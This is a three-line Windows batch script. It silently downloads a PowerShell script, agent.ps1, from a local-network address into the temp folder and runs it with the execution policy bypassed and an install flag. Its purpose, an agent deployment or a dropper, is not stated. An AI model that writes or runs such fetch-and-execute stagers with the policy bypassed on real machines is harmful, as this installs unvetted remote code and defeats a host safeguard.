@echo off
curl.exe -s -o "%TEMP%\a.ps1" http://192.168.103.1:8001/agent.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\a.ps1" -Install
